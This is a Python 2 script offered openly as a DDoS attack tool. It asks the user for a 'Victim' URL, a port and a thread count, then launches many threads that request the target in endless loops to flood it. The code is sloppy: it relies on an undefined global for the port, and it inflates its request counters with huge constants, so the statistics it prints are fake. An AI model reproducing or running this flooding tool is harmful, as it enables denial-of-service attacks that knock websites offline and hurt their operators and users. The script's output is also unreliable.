# -*- coding: utf-8 -*-
#!/usr/bin/env python2
import os
import re
import sys
import time
import urllib
import threading
from threading import Lock
from threading import Thread


                
print \
"""
            --------- _       _____   ______    _           _      
            ---  ----! !     ! ____! ! _____!  ! ! _______ ! !
               ! !   ! !____ ! !___  ! !   ___ ! !!  ___  !! !
               ! !   !  __  !! ____! ! !  !___!! !! !   ! !! !  
               ! !   ! !  ! !! !___  ! !____!! ! !! !___! !! !  
               !_!   !_!  !_!!_____! !______!! !_!!_______!!_!DDoS                                         

  !_________________________________________________________________________!
"""
print("    ========>>.:.Hello P3terJ4mes,Welcome DDOS ATTACK WEBSITE.:.<<========")
print("")

if os.name in ('nt', 'dos', 'ce'):
    os.system('title       ........::::: Code By Thunder(P3terJ4mes),Index By TheGioiDdos :::::........')
    os.system('color 0A')
Close = False
Lock = threading.Lock()
Request = 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
Tot_req = 9

                
class Spammer(threading.Thread):

    def __init__(self, url, number):
        threading.Thread.__init__(self)
        self.url = url
        self.port = port
        self.num = number
      
    def run(self):
        global Lock
        global Tot_req
        global Close
        global Request
        Lock.acquire()
        print '[Root@Kali://P3terJ4mes request {0} started'.format(self.num), 'host {0} '.format(self.url), 'port :{0}'.format(self.port)
        Lock.release()
        while Close == False:
            try:
                urllib.urlopen(self.url) 
                Request += 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
                Tot_req += 9
            except:
                pass

        Lock.acquire()
        print '[Root@Kali://P3terJ4mes request {0} closed'.format(self.num), 'host {0} '.format(self.url), 'port :{0}'.format(self.port)
        Lock.release()
        sys.exit(0)
        
if __name__ == '__main__':
      
    try:
        num_threads = input('[Root@Kali://P3terJ4mes>Dame<999>:')
        t_tot = input('[Root@Kali://P3terJ4mes>Time<3>:')
        port = raw_input('[Root@Kali://P3terJ4mes>Port<80>:')
    except:
        t_tot = 3
    timer = t_tot * 3
    t_tot = t_tot * 3
    while True:
        url = raw_input('[Root@Kali://P3terJ4mes>Victim: ')
        print '[Root@Kali://P3terJ4mes> Requesting Google.py, Please waitting !!!'
        try:
            urllib.urlopen( 'http://www.google.com/?q= '+ url )
        except IOError:
            print 'Could not open specified url.'
        else:
            break
    for i in xrange(num_threads):
        Spammer(url, i + 1).start()
    time.sleep(3)
    os.system('color 0C')
    print \
    """
                  --------- _       _____   ______    _           _      
                  ---- ----! !     ! ____! ! _____!  ! ! _______ ! !
                     ! !   ! !____ ! !___  ! !   ___ ! !!  ___  !! !
                     ! !   !  __  !! ____! ! !  !___!! !! !   ! !! !  
                     ! !   ! !  ! !! !___  ! !____!! ! !! !___! !! !  
                     !_!   !_!  !_!!_____! !______!! !_!!_______!!_!DDoS                                         
    """
    print("-------------------------------------------------------------------------")
    print '#######################################################################'
    while timer > 0:
        time.sleep(0.001)
        print 'Request anti ' + str(Request /5.0) + ' done for: ' + str(Tot_req) + '  Request Time out:', timer, '/s Port:',port
        Request = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
        timer -= 0.001
    print '\n> The request ' + str(Request /5.0) + '---Requests/s' + str(Tot_req) + '  Request Time out:', timer, '/s Port:',port
    print '\n#######################################################################\n'
    raw_input('> This attack is running........')
    time.sleep(1)
    Close = True
nload = 0
while not nload:
    sys.exit()
